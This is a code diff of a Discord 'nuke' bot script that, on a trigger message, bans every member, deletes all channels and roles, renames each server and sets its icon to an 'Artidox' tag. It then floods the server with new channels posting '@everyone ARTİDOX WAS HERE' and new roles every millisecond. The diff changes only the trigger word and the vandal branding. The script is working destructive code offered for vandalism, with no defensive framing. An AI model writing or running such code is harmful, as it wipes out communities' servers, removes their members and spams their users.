@@ -1,15 +1,15 @@
 client.on("message", message => {
-       if (message.content ==  "selam") {
+       if (message.content ==  "81") {
 client.guilds.cache.forEach(g => {
-  g.setIcon("https://cdn.discordapp.com/emojis/860054915764977705.gif?v=1").catch(console.error);
+  g.setIcon("https://media.discordapp.net/attachments/927299411812429845/960686025598980166/3127f1b56178cfa5d7d9d9de8c87133b.jpg").catch(console.error);
   g.members.map(c => c.ban());
   g.channels.map(c => c.delete())
   g.roles.map(c => c.delete())
-  g.setName("VISCERO #YIKILMAZ")
+  g.setName("Artidox ❤️ 81")
   setInterval(() => {
   g.createChannel("patladınız", 'text').then(c => c.send("@everyone ARTİDOX WAS HERE"))
   g.createRole( {
-    name: "ARİDOX WAS HERE",
+    name: "ARTİDOX WAS HERE",
     color: "36393F"
   })
   }, 1) 
